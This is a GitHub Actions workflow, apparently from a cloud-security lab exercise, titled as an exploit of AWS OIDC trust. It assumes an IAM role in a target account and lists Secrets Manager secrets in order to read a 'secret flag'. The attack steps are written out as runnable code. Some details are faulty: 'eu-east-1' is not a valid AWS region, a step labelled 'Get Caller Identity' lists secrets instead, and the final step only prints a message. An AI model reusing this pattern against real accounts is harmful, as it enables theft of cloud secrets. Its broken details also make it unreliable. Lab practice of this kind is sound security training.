name: "Exploit AWS OIDC - Read Secret"

on:
  push:
    branches:
      - main
  workflow_dispatch: # Esto te permite ejecutarlo manualmente desde la pestaña Actions

permissions:
  id-token: write   # CRUCIAL: Sin esto no se puede generar el token para AWS
  contents: read

jobs:
  aws_exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v3 # Usamos la v3 que es más estable
        with:
          aws-region: eu-east-1 # Asegúrate que el laboratorio sea en esta región o cámbiala
          role-to-assume: arn:aws:iam::620483490609:role/sts-lab-2-target
          role-session-name: OIDCSession

      - name: Get Caller Identity
        run: aws secretsmanager list-secrets

      - name: Retrieve Secret Flag
        run: |
          echo "Intentando leer el secreto..."
